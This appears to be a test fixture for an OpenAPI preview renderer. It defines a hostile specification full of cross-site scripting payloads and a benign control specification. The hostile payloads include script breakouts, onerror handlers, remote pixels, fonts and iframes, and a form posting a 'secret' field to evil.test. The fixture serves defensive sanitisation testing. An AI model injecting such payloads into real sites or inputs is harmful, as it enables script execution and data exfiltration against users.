/**
 * A specification whose text fields carry every injection vector the preview is
 * expected to neutralize: script terminators, inline scripts and handlers,
 * remote images and fonts, links, forms, and an external `$ref`.
 */
export const MALICIOUS_SPEC = {
  openapi: '3.1.0',
  info: {
    title: 'Hostile </script><script>window.__parentBreached = true;</script> API',
    version: '1.0.0',
    description: [
      '</script><script>parent.__parentBreached = true;</script>',
      '<img src="https://evil.test/pixel.png" onerror="parent.__parentBreached = true">',
      '<a href="https://evil.test/landing" id="evil-link">navigate away</a>',
      '<form action="https://evil.test/collect" method="post" id="evil-form">',
      '<input name="secret" value="x"><button type="submit">go</button></form>',
      '<style>@font-face{font-family:eek;src:url(https://evil.test/font.woff2)}</style>',
      '<iframe src="https://evil.test/frame"></iframe>',
    ].join('\n'),
  },
  servers: [{ url: 'https://evil.test/api' }],
  paths: {
    '/pets': {
      get: {
        operationId: 'listPets',
        summary: 'List pets <script>parent.__parentBreached = true;</script>',
        description: '<img src=x onerror="parent.__parentBreached=true">',
        responses: {
          '200': {
            description: 'ok',
            content: {
              'application/json': {
                schema: { $ref: 'https://evil.test/remote.yaml#/components/schemas/Remote' },
              },
            },
          },
        },
      },
    },
  },
  components: {
    schemas: {
      Pet: {
        type: 'object',
        description: '<script>parent.__parentBreached = true;</script>',
        properties: { name: { type: 'string' } },
      },
    },
  },
};

export const BENIGN_SPEC = {
  openapi: '3.1.0',
  info: { title: 'Benign API', version: '2.0.0', description: 'Nothing hostile here.' },
  paths: {
    '/health': {
      get: { operationId: 'health', summary: 'Health check', responses: { '200': { description: 'ok' } } },
    },
  },
};
